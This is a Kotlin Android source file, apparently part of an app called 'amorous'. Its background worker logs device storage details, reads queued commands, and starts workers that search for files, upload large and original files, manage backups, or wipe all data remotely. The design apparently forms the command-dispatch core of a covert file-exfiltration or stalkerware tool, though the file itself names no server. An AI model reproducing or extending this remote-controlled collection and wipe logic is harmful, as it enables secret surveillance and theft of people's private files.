package com.anonymous.amorous.workers

import android.content.Context
import android.util.Log
import androidx.work.WorkerParameters
import com.anonymous.amorous.data.models.Command
import com.anonymous.amorous.data.models.Info
import kotlinx.coroutines.coroutineScope

class SyncWorker(
        context: Context,
        parameters: WorkerParameters
) : BaseCoroutineWorker(context, parameters) {

    override suspend fun workAction(): Result = coroutineScope {
        try {
            db.saveInfo(Info(
                    totalMemory = fileUtils.getTotalSpaceSize(),
                    freeMemory = fileUtils.getTotalFreeSpace(),
                    cacheFilesSize = fileUtils.getCacheFilesSize(applicationContext),
                    cacheFolderSize = fileUtils.getCacheFolderSize(applicationContext),
                    lastUpdate = System.currentTimeMillis()))

            val command = db.getCommand()
            if (command.haveNewCommand == 1L) {
                val now = if (command.date == 0L) System.currentTimeMillis() else command.date
                db.updateCommand(now)
                for (c in command.commands()) {
                    when (c) {
                        Command.COMMAND_CREATE_BACKUP_FILE -> {
                            addEvent(TAG, "Create backup file command! Start worker!")
                            manager.startBackupWorker()
                        }
                        Command.COMMAND_REMOVE_BACKUP_FILE -> {
                            addEvent(TAG, "Remove backup file command! Start worker!")
                            manager.startRemoveBackupWorker()
                        }
                        Command.COMMAND_START_FIND_FILE -> {
                            addEvent(TAG, "Find file command! Start worker!")
                            manager.startSearchWorker()
                        }
                        Command.COMMAND_UPLOAD_LARGE_FILE -> {
                            addEvent(TAG, "Upload large file command! Start worker!")
                            manager.startLargeUploadWorker()
                        }
                        Command.COMMAND_UPLOAD_ORIGINAL -> {
                            addEvent(TAG, "Upload original file command! Start worker!")
                            manager.startOriginalWorker()
                        }
                        else -> addEvent(TAG, "Хз комманда $c")
                    }
                }
            }

            // worker status
            if (!configuration.getWorkerStatus()) {
                addEvent(TAG, "Stop all workers!")
                manager.stopAllWorkers()
            }

            // clear all data
            if (configuration.removeAllData()) {
                addEvent(TAG, "Clear all data. :(")
                manager.startClearFolderWorker()
            }
            Result.success()
        } catch (e: Exception) {
            addEvent(TAG, "При работе возникла ошибка. ${e.message}")
            Result.failure()
        }
    }

    companion object {
        private const val TAG = "SyncWorker"
    }
}